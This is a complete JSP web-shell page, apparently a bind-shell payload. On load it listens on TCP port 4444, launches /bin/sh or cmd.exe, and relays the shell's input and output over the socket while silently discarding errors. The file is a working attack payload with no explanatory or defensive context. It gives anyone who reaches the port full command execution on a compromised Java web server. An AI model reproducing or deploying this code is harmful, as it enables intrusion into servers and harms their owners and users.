<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream lw;
    OutputStream yf;

    StreamConnector( InputStream lw, OutputStream yf )
    {
      this.lw = lw;
      this.yf = yf;
    }

    public void run()
    {
      BufferedReader fw  = null;
      BufferedWriter olh = null;
      try
      {
        fw  = new BufferedReader( new InputStreamReader( this.lw ) );
        olh = new BufferedWriter( new OutputStreamWriter( this.yf ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = fw.read( buffer, 0, buffer.length ) ) > 0 )
        {
          olh.write( buffer, 0, length );
          olh.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( fw != null )
          fw.close();
        if( olh != null )
          olh.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    ServerSocket server_socket = new ServerSocket( 4444 );
    Socket client_socket = server_socket.accept();
    server_socket.close();
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
    ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

